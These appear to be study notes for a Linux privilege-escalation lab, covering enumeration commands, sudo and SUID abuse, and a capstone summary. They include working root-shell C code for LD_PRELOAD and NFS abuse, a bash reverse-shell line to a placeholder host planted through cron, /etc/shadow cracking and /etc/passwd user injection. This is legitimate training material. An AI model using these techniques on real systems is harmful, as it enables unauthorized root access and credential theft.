## Enumeration

`hostname` - Returns the hostname of the machine, might reveal the machine role.

`uname -a` - Prints system information giving us additional detail about the kernel.

`/proc/version` - The proc file system provide information about system processes, the version file may give you information about the kernel version, and more information like if a compiler is installed.

`/etc/issue` - This file usually contains details about the OS, but can be easily customized or changed.

`env` - Show environmental variables, the PATH variable could be very useful.

`sudo -l` - List all commands your user can run as sudo.

`id [username]` - Overview of privileges and group membership.

`cat /etc/passwd | cut -d ":" -f 1` - Return a list of all users, you can use `grep home` to only return real users.

`ip route` - See which network routes exist.
##### ps Command

The output of the `ps` (Process Status) will show the following:

- PID: The process ID (unique to the process)
- TTY: Terminal type used by the user
- Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
- CMD: The command or executable running (will NOT display any command line parameter)

`ps` - Show processes for the current shell.
`ps -A` - show all running processes.
`ps axjf` - View process tree.
`ps aux` - Will show processes for all users (a), the user that launched the process (u) and processes that are not attached to a terminal (x), we can have a better understanding of the system and potential vulnerabilities with this command.

##### netstat

Look into existing connections with this command.

`netstat -a` - Show all listening port end established connections.
`netstat -t/u` - List only TCP or UDP protocols.
`netstat -l` - List ports in listening state.
`netstat -s` - List network usage statistics by protocol.
`netstat -pt` - List connections with the service name and PID information.
`netstat -i` - Show interface statistics.
`netstat -ano` - Display all sockets, do not resolve names and display timers.

##### Find Command

- `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
- `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
- `find / -type d -name config`: find the directory named config under “/”
- `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
- `find / -perm a=x`: find executable files
- `find /home -user frank`: find all files for user “frank” under “/home”
- `find / -mtime 10`: find files that were modified in the last 10 days
- `find / -atime 10`: find files that were accessed in the last 10 day
- `find / -cmin -60`: find files changed within the last hour (60 minutes)
- `find / -amin -60`: find files accesses within the last hour (60 minutes)
- `find / -size 50M`: find files with a 50 MB size
- `find / -size +100M -type f 2>/dev/null` - Find files with size bigger than 100 MB and redirect all errors.

Folders and files that can be written to or executed from:

- `find / -writable -type d 2>/dev/null` : Find world-writeable folders
- `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
- `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders
- `find / -perm -o x -type d 2>/dev/null`

Find development tools and supported languages:

- `find / -name perl*`
- `find / -name python*`
- `find / -name gcc*`

`find / -perm -u=s -type f 2>/dev/null` - Find files with the SUID bit set.

##### Automated enumeration tools.

- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LES](https://github.com/mzet-/linux-exploit-suggester) (Linux Exploit Suggester)
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [Linux Priv Checker](https://github.com/linted/linuxprivchecker)

## Kernel Exploits

The kernel manages the communications between components, like the memory and applications, this function requires specific privileges.

A failed kernel exploit could lead to system crash.

Identify the kernel version, search for an exploit and run it, [Linux Kernel CVEs](https://www.linuxkernelcves.com/cves) is one place to look for kernel exploits.
Add `-P /tmp/` to write to a directory you have permission to.

Notes:

- Some exploits can make irreversible changes.
- Some exploits my require further interaction when thy run

## Sudo

[gtfobins](https://gtfobins.github.io/) is a website with information about how any program with sudo rights or SUID bit set and more can be used to gain higher privileges.

##### Leverage Application Functions

For example applications like Apache2 won't have known exploits, we can use the `-f` option which is used to load alternate configuration file and specify the `/etc/shadow` file which will display an error message with the first line of the file.

##### Leverage LD_PRELOAD

LD_PRELOAD allows programs to use shared libraries, if the env_keep option is enabled we can generate a shared library that will be loaded and executed before the program, the real user ID and the effective user ID should be the same.

1. `sudo -l` - Check for LD_PRELOAD with the env_keep option.
2. Write a simple c code compiled as shared object (with the .so extension).
3. Run the program with sudo and the LD_PRELOAD option pointing to our shared object.

The c code that will spawn a root shell:

```
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}
```

`gcc -fPIC -shared -o <.so output file name> <.c file name> -nostartfiles` - Compile the file into a shared object.

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so <program>` - Run a program the user can run with sudo, with the LD_PRELOAD set to our shared object.

## SUID

SUID (Set-user identification) and SGID (Set-group identification) allows programs to execute with the permission of the user or group owner.

`find / -type f -perm -04000 -ls 2>/dev/null` - List files which have SUID or SGID bit set.

With SUID set for Nano we can elevate privileges by reading the `/etc/shadow file` or by adding our user to the `/etc/passwd` file.

##### Reading The `/etc/shadow` file

`unshadow passwd.txt shadow.txt > passwords.txt` - After reading the contents of `/etc/shadow` you can use this to crack the password with John.

##### Add a New User to The `/etc/passwd` File

`openssl passwd -1 -salt THM password1` - Hash value for the password of the new user.

Now add a new line to the `/etc/passwd` file with the hash and `/bin/bash` as the shell.

## Capabilities

Capabilities help manage privileges on a more granular level, giving employees access only to the resources they need.

`getcap -r 2>/dev/null` - List enabled capablities

You can use gtfobins for capabilities too.

## Cron Jobs

Find a script location in the `/etc/crontab` file, modify the script to run a reverse shell and start a listener.

You can also use deleted scripts or scripts without a full path and put a reverse shell in the path.

Or you can understand the script and exploit the tools it uses using wildcards.

Example reverse shell script, you might need to use another 1:

```
#!/bin/bash

bash -i >& /dev/tcp/<ip address>/<port> 0>&1
```

## PATH

PATH is an environment variable which tells the system where to look for commands not built in to the shell or that not defined with a full path.

`echo $PATH` - echo the PATH.

If you have write permission to a folder in the path and application or script to abuse, you can use it to elevate privileges.

`chmod u+s <file>` - Set the SUID bit for a file that executes another.
`find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u` - Search for writable folders.
`find / -writable 2>/dev/null | grep <parent writable folder> | cut -d "/" -f 2,3 | sort -u` - Search for writable folders under a specific folder.
`export PATH=/tmp:$PATH` - Add the `/tmp` folder to the start of the path.

Now add `/bin/bash` to the binary that will run by the script with root privileges and add executable permissions, than run the script.

## NFS

Sometimes we will use shared folders and remote management interfaces such as SSH and Telnet rather than elevating the privileges of the current user.
Sometimes there will be a misconfigured network shell.

`cat /etc/exports` - Read the contents of the NFS (Network File Sharing file).

By default NFS will change the root user to nfsnobody which means no file can operate with root privileges, if the no_root_squash option is present on a writable share we can create and run an executable with the SUID bit set.

`showmount -e <ip address>` - Enumerate mountable shares from the attacking machine.
`mkdir <folder to mount to>` - Create a folder to mount to.
`mount -o rw <ip address>:/<no_root_squash share> <folder to mount to>` - Mount one of the no_root_squash shares.

Create .c executable that will run /bin/bash:

```
int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

`gcc <.c file> -o nfs -w` - Compile the executable.
`chmod +s nfs` - Set SUID for the new executable.
`./nfs` - run the executable from the target unprivileged machine to gain root privileges.

## Capstone Challenge

Base64 has SUID set, as well as passwd.
User Leonardo can't run sudo.
Was able to get flag2 by the base64 SUID.
Got privileges of user Milly by cracking the /etc/shadow hash using john.
Elevated privileges to root with the sudo permission Milly has over find.